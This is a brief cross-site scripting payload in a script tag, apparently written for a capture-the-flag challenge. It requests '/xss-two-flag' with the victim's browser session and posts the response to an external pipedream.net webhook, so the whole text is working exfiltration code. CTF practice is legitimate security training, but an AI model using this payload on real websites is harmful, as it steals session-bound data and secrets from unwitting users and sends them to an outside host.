<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "/xss-two-flag", true);

  xhr.onreadystatechange = function() {
    var payload = xhr.responseText;
    var hook = new XMLHttpRequest();
    var webhookUrl = "https://eoijraxllprbjcu.m.pipedream.net";
    hook.open("POST", webhookUrl, false);
    hook.send("flag="+payload);
  };

  xhr.send(null);
</script>